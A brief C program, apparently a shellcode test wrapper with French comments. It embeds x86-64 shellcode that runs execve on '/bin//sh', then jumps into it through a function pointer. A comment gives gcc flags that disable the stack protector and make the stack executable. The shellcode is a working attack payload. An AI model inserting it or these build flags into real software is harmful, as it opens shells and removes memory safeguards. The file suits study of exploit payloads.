
#include <stdio.h>
#include <string.h>

char code[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int main(int argc, char **argv)
{
        int (*func)(); // déclare un pointeur de fonction pour une fonction, arguments non spécifiés et retourne un int
        func = (int (*)()) code; // initialise le pointer en le faisant pointer sur code
        (int)(*func)(); // appel de fonction
}

//Compilation : gcc -fno-stack-protector -z execstack wrapper.c -o wrapper
